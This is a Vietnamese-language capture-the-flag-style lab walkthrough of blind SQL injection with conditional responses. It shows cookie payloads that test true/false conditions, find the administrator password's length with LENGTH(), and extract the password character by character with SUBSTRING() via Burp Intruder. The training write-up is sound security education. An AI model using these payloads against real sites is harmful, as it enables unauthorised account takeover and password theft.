# Blind SQL injection with conditional responses

Khi mới vào ta thấy đây là 1 trang web bình thường, thử `F5` xem nhé, vậy là thấy sự khác nhau trước và sau khi tải lại trang:

- Trước khi `Reload`:

![](https://cdn.discordapp.com/attachments/1124588087931043891/1135511855901708328/image.png)

- Sau khi `Reload`:

![](https://cdn.discordapp.com/attachments/1124588087931043891/1135511905327403018/image.png)

Vậy là xuất hiện thông báo `Welcome back!`.

- Ta thay đổi Cookie thành dạng:
   - `TrackingId=xxx' and '1'='1` thì vẫn thấy thông báo `Welcome back!`.
   - `TrackingId=xxx' and '1'='2` thì không thấy thông báo `Welcome back!` nữa.

Vậy đây là Blind SQL injection.

Bài lab này cho ta biết dữ liệu bên trong bảng `users` gồm 2 cột `username` và `password`, yêu cầu là ta phải đăng nhập với tài khoản `administrator`.

Sử dụng câu lệnh sau để xem có bao nhiêu kí tự trong mật khẩu của quản trị viên, nếu xuất hiện thông báo `Welcome back!` nghĩa là điều kiện bên trong câu lệnh là `True`
- `TrackingId=xxx' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
- `TrackingId=xxx' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
- `TrackingId=xxx' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
...

- `TrackingId=xxx' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a`
- `TrackingId=xxx' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a` (Tới đây thì đã False)

Vậy là mật khẩu quản trị viên chưa 20 kí tự.

![](https://cdn.discordapp.com/attachments/1124588087931043891/1135946312303525919/image.png)

Tiếp theo ta sử dụng câu lệnh sau để dò từng kí tự của mật khẩu:
- `TrackingId=xxx' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='3`

Ta send request tới Intruder và brute force từng kí tự của mật khẩu 

- `TrackingId=xxx' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§b§` ( add biến cần thay đổi vào payload)

![](https://cdn.discordapp.com/attachments/1124588087931043891/1135948776838803548/image.png)

- Tiếp theo click vài `Payloads` rồi add thêm items(bao gồm tất cả chữ cái và chữ số) rồi `Start attacks`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1135949207107280906/image.png)

Ta để ý ở phần `Length` xem cái nào dài nhất thì cái đó chính là `True` và chứa kí tự của mật khẩu.

Tiếp theo ta thay đổi SUBSTRING(password,`thứ tự của kí tự trong mật khẩu`,1) rồi brute force và sẽ tìm được mật khẩu (vì mình dùng BurpSuite bản lỏd nên phải làm như này, nếu là Burp pro thì chỉ cần brute một lần là có mật khẩu luôn rùi).
Sau khi có mật khẩu rùi thì đăng nhập với tên đăng nhập `administrator` và solve lab thui.

